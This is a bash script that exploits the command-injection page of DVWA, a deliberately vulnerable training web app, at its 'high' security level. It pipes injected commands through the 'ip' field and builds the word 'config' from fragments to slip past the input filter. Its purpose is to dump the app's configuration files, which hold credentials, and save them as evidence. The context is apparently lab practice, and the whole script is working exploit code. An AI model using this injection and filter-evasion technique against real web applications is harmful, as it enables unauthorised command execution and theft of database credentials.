#!/bin/bash
# cfg.sh — exfiltrate DVWA config via RCE at high level using shell indirection
CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=high'
BASE='http://10.31.0.87:3000'
t() {
  curl -s -b "$CK" --data-urlencode "ip=localhost|$1" --data-urlencode 'Submit=Submit' \
    "$BASE/vulnerabilities/exec/" | tr '\n' ' ' | grep -oE '<pre>[^<]*</pre>' | head -c 4000
  echo; echo " <== $1"
}
C=co; C2=${C}nfig
mkdir -p evidence/chain
t "cat ../../${C2}/${C2}.inc.php"  | tee evidence/chain/dvwa_cfg_dump.txt
t "cat ../../${C2}/${C2}.inc.php.bak" | tee evidence/chain/dvwa_cfg_bak.txt | head -c 1500
echo
t "cat ../../${C2}/${C2}.inc.php.dist" | head -c 1500
